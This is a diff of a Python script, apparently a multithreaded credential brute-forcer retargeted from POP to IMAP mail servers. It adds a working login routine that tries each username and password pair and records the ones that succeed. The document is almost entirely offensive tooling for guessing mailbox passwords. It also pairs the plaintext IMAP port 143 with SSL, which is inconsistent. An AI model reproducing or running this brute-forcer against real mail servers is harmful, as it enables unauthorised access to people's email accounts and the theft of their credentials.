@@ -1,5 +1,6 @@
 #! /usr/bin/env python3
 
+import imaplib
 from datetime import date
 from optparse import OptionParser
 from colorama import Fore, Back, Style
@@ -23,19 +24,34 @@ def get_arguments(*args):
         parser.add_option(arg[0], arg[1], dest=arg[2], help=arg[3])
     return parser.parse_args()[0]
 
-port = 995
+port = 143
 use_ssl = True
 ignore_errors = True
 lock = Lock()
 
-def login(pop_server, port, user, password):
-    pass
-def brute_force(thread_index, pop_server, port, credentials):
+def login(imap_server, port, user, password):
+    t1 = time()
+    try:
+        if use_ssl:
+            imap = imaplib.IMAP4_SSL(imap_server, port)
+        else:
+            imap = imaplib.IMAP4(imap_server, port)
+        imap.login(user, password)
+        imap.select("inbox")
+        imap.close()
+        t2 = time()
+        return True, t2-t1
+    except Exception as error:
+        t2 = time()
+        if "Authentication failed" in str(error):
+            return False, t2-t1
+        return error, t2-t1
+def brute_force(thread_index, imap_server, port, credentials):
     successful_logins = {}
     for credential in credentials:
         status = ['']
         while status[0] != True and status[0] != False:
-            status = login(pop_server, port, credential[0], credential[1])
+            status = login(imap_server, port, credential[0], credential[1])
             if status[0] == True:
                 successful_logins[credential[0]] = credential[1]
                 with lock:
